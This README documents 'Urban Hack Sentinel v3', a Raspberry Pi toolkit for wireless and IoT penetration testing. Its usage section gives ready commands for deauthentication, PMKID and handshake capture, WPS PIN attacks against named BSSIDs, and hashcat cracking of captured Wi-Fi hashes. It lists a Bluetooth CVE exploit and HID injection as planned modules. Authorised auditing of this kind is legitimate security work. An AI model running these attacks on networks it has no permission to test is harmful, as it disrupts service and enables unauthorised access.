# Urban Hack Sentinel v3

> **Auditoria Wi-Fi/Bluetooth/IoT automatizada para Raspberry Pi**
> Framework modular em Python 3.11+ com scanning WiFi, ataques WPA/WPA3, WPS, BLE, wardriving GPS, Metasploit integration, e dashboard web/TUI.

---

## 🎯 O que faz esta aplicação

**Urban Hack Sentinel v3** transforma um Raspberry Pi numa plataforma completa de auditoria wireless/Bluetooth/IoT que opera continuamente:

### 🎯 Core Capabilities (Sprint 0-1)
| Capability | Status | Description |
|------------|--------|-------------|
| **WiFi Scanner** | ✅ | Passive/active scan 2.4/5/6 GHz via `iw` JSON + `airodump-ng` fallback |
| **PMKID Attack** | ✅ | Client-less PMKID capture (WPA2/WPA3) via `hcxdumptool` + `hcxpcapngtool` |
| **Handshake Capture** | ✅ | Deauth + 4-way handshake via `aireplay-ng` + `airodump-ng` |
| **WPS Pixie Dust** | ✅ | Offline PIN attack via `reaver --pixie-dust` |
| **WPS PIN Dictionary** | ✅ | Common PIN database per OUI |
| **Deauth Attack** | ✅ | Targeted/broadcast deauth via `aireplay-ng` |
| **MAC Randomization** | ✅ | OUI profiles (Apple, Samsung, Intel, Realtek, Atheros) |
| **Handshake Manager** | ✅ | Deduplication, Hashcat integration, WiGLE/Kismet export |

### 🚀 Advanced Features (Sprint 2-5)
| Module | Status | Description |
|--------|--------|-------------|
| **BLE/Fast Pair** | 🔄 | Fast Pair scanner, WhisperPair (CVE-2025-36911) exploit |
| **Camera Discovery** | 🔄 | ONVIF/RTSP/HTTP, default creds, vuln scanning |
| **Network Scanner** | 🔄 | Nmap wrapper, OS fingerprint, service enum |
| **Metasploit RPC** | 🔄 | Module execution, session management |
| **Nuclei Scanner** | 🔄 | Template-based vuln scanning |
| **HID/USB Gadget** | 🔄 | DuckyScript, HID injection, USB gadget profiles |
| **Geo/wardriving** | 🔄 | GPS/MLAT, Kismet/Wigle/CSV/KML export |

---

## 🚀 Quick Start

### Hardware Requirements
| Component | Specification |
|-----------|---------------|
| **Pi** | Raspberry Pi 4/5 (4GB+ RAM recommended) |
| **WiFi USB** | Monitor mode + injection capable (Alfa AWUS036ACH/AXML, mt7921u, rtl8812au) |
| **Bluetooth** | Built-in Pi 5 or USB CSR 4.0/5.0 dongle |
| **GPS (optional)** | u-blox USB (VK-172, etc.) |
| **Storage** | SSD USB 256GB+ for pcaps/chroot |
| **Power** | 5V 5A (27W) + UPS HAT recommended |

### Installation
```bash
# 1. Clone
git clone https://github.com/andresantos/urban-hack-sentinel
cd urban-hack-sentinel

# 2. Virtual env + dependencies
python3 -m venv .venv
source .venv/bin/activate
pip install -e ".[dev]"

# 3. System dependencies
sudo apt update && sudo apt install -y \
    aircrack-ng hcxtools reaver bully macchanger iw jq \
    bluez bluez-tools gpsd gpsd-clients \
    nmap nuclei metasploit-framework hashcat \
    libgpgme-dev libbluetooth-dev libpcap-dev

# 4. Capabilities (avoid root)
sudo setcap 'cap_net_admin,cap_net_raw+ep' $(which airodump-ng aireplay-ng aircrack-ng hcxdumptool hcxpcapngtool)
sudo setcap 'cap_net_admin,cap_net_raw+ep' $(which nmap nuclei msfconsole)

# 5. Configure
cp config.env.example /etc/urban-hack-sentinel/config.env
sudo vim /etc/urban-hack-sentinel/config.env

# 6. Run
source .venv/bin/activate
python -m urban_hs.cli.main --help
python -m urban_hs.cli.main --scan --interface wlan1
```

---

## 📋 Configuration

### Main Config (`/etc/urban-hack-sentinel/config.env`)
```ini
# Core
WIFI_IFACE=wlan1                    # Your monitor-mode USB interface
SCAN_STRATEGY=passive_only          # passive_only | mode_switch | direct
SCAN_INTERVAL=30                    # Seconds between scan cycles

# WiFi
CHANNELS_2GHZ=1,2,3,4,5,6,7,8,9,10,11,12,13
CHANNELS_5GHZ=36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,144
CHANNELS_6GHZ=1,5,9,13,17,21,25,29,33,37,41,45,49,53,57,61,65,69,73,77,81,85,89,93,97,101,105,109,113,117,121,125,129,133,137,141,145,149,153,157,161,165,169,173,177,181,185,189,193,197,201,205,209,213,217,221,225,229,233

# Attacks
ENABLE_ACTIVE_ATTACKS=false          # Set true for deauth/WPS/handshake
ATTACK_TIMEOUT=120
HANDSHAKE_TIMEOUT=60
PMKID_TIMEOUT=120
WPS_TIMEOUT=120
DEAUTH_COUNT=10

# GPS
GPSD_HOST=localhost
GPSD_PORT=2947

# MAC Randomization
MAC_RANDOMIZE_INTERVAL=300          # 0 = disabled, seconds between randomizations
```

### Directories
```
/var/log/urban-hs/           # Logs + JSONL metrics
/var/lib/urban-hs/
├── hashes/                  # hashcat 22000 files
├── pcaps/                   # Raw pcapng captures
├── artifacts/               # Exploit artifacts, screenshots
/cracked/                    # Cracked passwords
```

---

## 🎯 Usage Examples

### 1. Basic Scan
```bash
# Daemon mode
urban-hs --scan --interface wlan1 --duration 300

# One-shot scan with output
urban-hs --scan-once --interface wlan1 --channels 1,6,11,36,40,44,48
```

### 2. PMKID Attack (WPA2/WPA3)
```bash
# Single target
urban-hs --attack pmkid --bssid 8c:90:2d:0f:71:69 --channel 9 --interface wlan1

# Multiple targets from scan
urban-hs --attack pmkid --from-scan --interface wlan1 --min-signal -75
```

### 3. Handshake Capture
```bash
urban-hs --attack handshake --bssid 8c:90:2d:0f:71:69 --channel 9 \
    --essid "NOS-A2D6_EXT" --deauth-count 10 --interface wlan1
```

### 4. WPS Attacks
```bash
# Pixie Dust (offline PIN)
urban-hs --attack wps_pixie --bssid 74:9b:e8:80:a2:d6 --channel 9

# PIN Dictionary
urban-hs --attack wps_pins --bssid 74:9b:e8:80:a2:d6 --channel 9
```

### 5. Deauth Attack
```bash
# Broadcast deauth
urban-hs --attack deauth --bssid 74:9b:e8:80:a2:d6 --channel 9 --count 10

# Targeted deauth (specific client)
urban-hs --attack deauth --bssid 74:9b:e8:80:a2:d6 --channel 9 \
    --client-mac ac:f1:08:79:94:41 --count 10
```

### 5. PMKID + Handshake + Cracking
```bash
# Full pipeline
urban-hs --attack pmkid --bssid ... --channel 9
# ... wait ...
hashcat -m 22000 /var/lib/urban-hs/hashes/*.22000 \
    -a 3 -w 3 '?l?l?l?l?l?l?l?l' --potfile-path /tmp/cracked.pot
```

---

## 🔧 API Server + Dashboard

```bash
# Start API server (FastAPI)
urban-hs --server --host 0.0.0.0 --port 8080

# Textual TUI (terminal dashboard)
urban-hs --tui

# Web dashboard (React PWA - served by API)
open http://pi-ip:8080
```

### API Endpoints
```
GET  /api/status              # System status, temps, jobs
GET  /api/networks            # Discovered networks
GET  /api/networks/{bssid}    # Network details
GET  /api/attacks             # Active/finished attacks
GET  /api/handshakes          # Captured handshakes
GET  /api/handshakes/{id}     # Handshake details
GET  /api/metrics/ws          # WebSocket live metrics
GET  /api/gps                 # Current GPS position
GET  /healthz                 # Health check
GET  /metrics                 # Prometheus metrics
```

---

## 🔓 Cracking Pipeline

```bash
# 1. PMKIDs to hashcat
urban-hs --export hashcat --output /tmp/pmkids.22000

# 2. Handshakes to hashcat
urban-hs --export hashcat --type handshake --output /tmp/hs.22000

# 3. Combined cracking
hashcat -m 22000 /var/lib/urban-hs/hashes/*.22000 \
    -a 3 -w 3 '?l?l?l?l?l?l?l?l' \
    --potfile-path /var/lib/urban-hs/cracked/cracked.pot \
    --gpu-temp-retention=80

# Wordlist + rules
hashcat -m 22000 /var/lib/urban-hs/hashes/*.22000 \
    /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Distributed (Hashtopolis)
hashtopolis-agent --server https://hashtopolis.local --key <key>
```

---

## 📊 Wardriving / GPS Export

```bash
# Enable GPS
sudo systemctl enable --now gpsd
# Config: GPSD_OPTIONS="-n /dev/ttyUSB0"

# Export to WiGLE CSV
urban-hs --export wiggle --output /tmp/wardrive.csv

# Export to Kismet netxml
urban-hs --export kismet --output /tmp/wardrive.netxml

# Export to Google Earth KML
urban-hs --export kml --output /tmp/wardrive.kml
```

---

## 🏗️ Architecture

```
urban_hs/
├── core/                    # Shared infrastructure
│   ├── event_bus.py         # Async pub/sub + DLQ
│   ├── config.py            # Pydantic v2 + hot-reload
│   ├── process_mgr.py       # Advanced subprocess + chroot
│   ├── storage.py           # SQLite WAL + Redis + JSONL
│   ├── logger.py            # JSONL + Rich + correlation IDs
│   └── __init__.py          # Core bootstrap
│
├── modules/
│   ├── wifi/                # ✅ Sprint 1 - Complete
│   │   ├── scanner.py       # WiFi scan backends
│   │   ├── attacks.py       # Handshake/PMKID/WPS/Deauth
│   │   ├── managers.py      # Handshake/Hashcat/GPS/MAC
│   │   └── plugin.py        # Core integration
│   │
│   ├── ble/                 # 🔄 Sprint 2
│   │   ├── fastpair.py      # Fast Pair scanner
│   │   ├── whisperpair.py   # CVE-2025-36911 exploit
│   │   └── audio_hfp.py     # HFP audio capture
│   │
│   ├── network/             # 🔄 Sprint 3
│   │   ├── scanner.py       # Nmap wrapper
│   │   ├── nuclei.py        # Nuclei runner
│   │   └── camera.py        # Camera discovery/enum
│   │
│   ├── metasploit/          # 🔄 Sprint 4
│   │   └── msf_rpc.py       # MSF RPC client
│   │
│   ├── exploit/             # 🔄 Sprint 4
│   │   └── runner.py        # Generic exploit execution
│   │
│   ├── hid/                 # 🔄 Sprint 5
│   │   ├── ducky.py         # DuckyScript parser
│   │   └── injector.py      # uinput/usb-gadget HID
│   │
│   ├── usb/                 # 🔄 Sprint 5
│   │   └── gadget.py        # USB gadget profiles
│   │
│   └── reporting/           # 🔄 Sprint 4
│       └── generator.py     # Markdown/PDF reports
│
├── ui/
│   ├── api/                 # FastAPI + WebSocket
│   ├── tui/                 # Textual TUI
│   └── cli/                 # Typer CLI
│
├── chroot/alpine/           # Alpine bootstrap + tooling
└── tests/                   # pytest + mac80211_hwsim CI
```

---

## 🔌 Plugin Development

```python
# Create a custom module
from urban_hs.core import get_event_bus, get_storage
from urban_hs.core.event_bus import EventHandler, Event

class MyModule(EventHandler):
    @property
    def event_types(self) -> set[str]:
        return {"wifi.networks_updated", "wifi.attack_complete"}
    
    async def handle(self, event: Event) -> None:
        if event.type == "wifi.networks_updated":
            networks = event.payload["networks"]
            # Custom processing...
```

---

## 🧪 Testing

```bash
# Unit tests
pytest tests/ -v -m unit

# Integration tests (require hardware)
pytest tests/ -v -m integration --hardware

# WiFi simulation (no hardware)
pytest tests/ -v -m simulation

# Coverage
pytest --cov=urban_hs --cov-report=html
```

### CI Pipeline (GitHub Actions)
```yaml
# .github/workflows/ci.yml
- uses: actions/checkout@v4
- name: Setup Python
  uses: actions/setup-python@v5
  with: { python-version: '3.11' }
- name: Dependencies
  run: pip install -e ".[dev]"
- name: Lint
  run: ruff check src/ && mypy src/
- name: Tests
  run: pytest -v -m "not hardware"
```

---

## 📁 Project Structure

```
urban-hack-sentinel/
├── pyproject.toml           # Poetry config
├── README.md                # This file
├── MASTER_PLAN.md           # Sprint roadmap
├── INTEGRATION_ANALYSIS.md  # WPair/Stryker analysis
├── ROADMAP.md               # Feature backlog
├── docker/Dockerfile.arm64  # Container build
├── config.env.example       # Config template
├── urban-hack-sentinel.service  # systemd unit
├── src/urban_hs/            # Main package
├── tests/                   # pytest suite
└── docs/                    # MkDocs site
```

---

## 🔧 Troubleshooting

| Problem | Solution |
|---------|----------|
| `Operation not supported` on monitor mode | Use compatible USB adapter (not internal brcmfmac) |
| `hcxdumptool: permission denied` | `sudo setcap 'cap_net_admin,cap_net_raw+ep' $(which hcxdumptool)` |
| Scan returns 0 networks | Check `aireplay-ng -9 wlan1` for injection capability |
| Temp > 75°C | Add heatsink/fan, reduce `MAX_JOBS=1` |
| WPS always fails | AP has lockout or WPS disabled; focus PMKID/handshake |
| `reaver` not found | `sudo apt install reaver` or use `bully` |
| Empty hashcat files | Increase `PMKID_TIMEOUT`; verify signal > -85 dBm |
| GPS not working | Check `gpsd` service; verify `/dev/ttyUSB0` |

---

## ⚖️ Legal & Ethics

**MIT License** — Educational and **authorized auditing** only.

> **Author not responsible for misuse.**
> Only audit networks you own or have written permission to test.
> Unauthorized access to networks is illegal in most jurisdictions.

---

## 🤝 Contributing

PRs welcome for:
- New chipset/driver support
- WPS Pixie-Dust improvements
- Camera/IoT protocol support
- Dashboard UI/UX
- Performance optimization (ARM64 NEON)

---

## 📚 References

- [802.11 Frame Types](https://mrncciew.com/2014/10/08/802-11-mgmt-frame-types/)
- [PMKID Attack](https://hashcat.net/forum/thread-6661.html)
- [WPA3 SAE](https://www.wi-fi.org/discover-wi-fi/wi-fi-certified-wpa3)
- [WPS Pixie-Dust](https://github.com/wiire-a/pixiewps)
- [hcxtools](https://github.com/ZerBea/hcxtools)
- [hashcat 22000](https://hashcat.net/wiki/doku.php?id=wpa_pmkid)
- [Compatible Cards](https://github.com/aircrack-ng/aircrack-ng/wiki/Compatible-cards)

---

<sub>Urban Hack Sentinel v3 — Built for Raspberry Pi, by security researchers who value clean code and strong coffee ☕</sub>